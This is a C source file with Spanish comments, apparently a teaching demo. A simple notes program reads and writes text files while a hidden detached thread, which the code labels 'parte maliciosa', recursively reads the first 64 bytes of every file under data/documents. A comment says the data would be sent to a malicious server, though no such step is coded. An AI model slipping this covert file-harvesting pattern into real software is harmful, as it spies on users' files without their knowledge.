#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/stat.h>


void spy_dirs(char* path) {
    /* 
      Parte maliciosa :
        Abre todos los ficheros, incluidos los que se encuentran internos al directorio.
        Lee los primeros 64 bytes
    */
    struct dirent *de;
    struct stat statbuf;
    char fullpath[1024];
    char buffer[64];

    DIR *dr = opendir(path);
    // Leer y listar los archivos del directorio
    while ((de = readdir(dr)) != NULL) {
        if (strcmp(de->d_name, "..") != 0 && strcmp(de->d_name, ".") != 0 && strcmp(de->d_name, "canciones") != 0) {

            snprintf(fullpath, sizeof(fullpath), "%s/%s", path, de->d_name);
            stat(fullpath, &statbuf);
            if (S_ISDIR(statbuf.st_mode)) {
                // Si se topa con un directorio vuelve a llamar a esta función para encontrar más ficheros
                spy_dirs(fullpath);
            } else if (S_ISREG(statbuf.st_mode)) {
                int f;
                f = open(fullpath, O_RDONLY, 0644);
                read(f, buffer, 64);
                close(f);

                // Aquí los mandaría a su servidor malicioso
            }
        }
    }

    // Cerrar el directorio
    closedir(dr);
}

int main(int argc, char **argv) {

    pthread_t thread;
    pthread_attr_t attr_thread;
    pthread_attr_init(&attr_thread);
    pthread_attr_setdetachstate(&attr_thread, PTHREAD_CREATE_DETACHED);
    
    char *path = "data/documents";
    pthread_create(&thread, &attr_thread, (void *)spy_dirs, (void *)path);

    int fd_txt;
    char buffer[32];
    
    fd_txt = open("data/documents/lista_compra.txt", O_RDONLY, 0644);
    printf("Leyendo lista_compra.txt:\n");

    while (read(fd_txt, buffer, 32) > 0){
        printf("%s", buffer);
        memset(buffer, 0, sizeof(buffer));
    }
    close(fd_txt);

    fd_txt = open("data/canciones/lyrics.txt", O_RDONLY, 0644);
    printf("\r\nLeyendo lyrics.txt:\n");

    while (read(fd_txt, buffer, 32) > 0){
        printf("%s", buffer);
        memset(buffer, 0, sizeof(buffer));
    }
    close(fd_txt);

    fd_txt = open("data/documents/recordatorios.txt", O_CREAT | O_WRONLY, 0644);
    printf("\r\nEscribiendo recordatorios.txt:\n");

    lseek(fd_txt, 0, SEEK_END);
    write(fd_txt, "-Dar de comer al pez\r\n", 22);
    write(fd_txt, "-Sacar la basura\r\n", 18);
    write(fd_txt, "-Hacer las tareas del hogar\r\n", 29);

    close(fd_txt);
    printf("\n===============\nFinalizando programa notas\n===============\n");
    
    return 0;
}
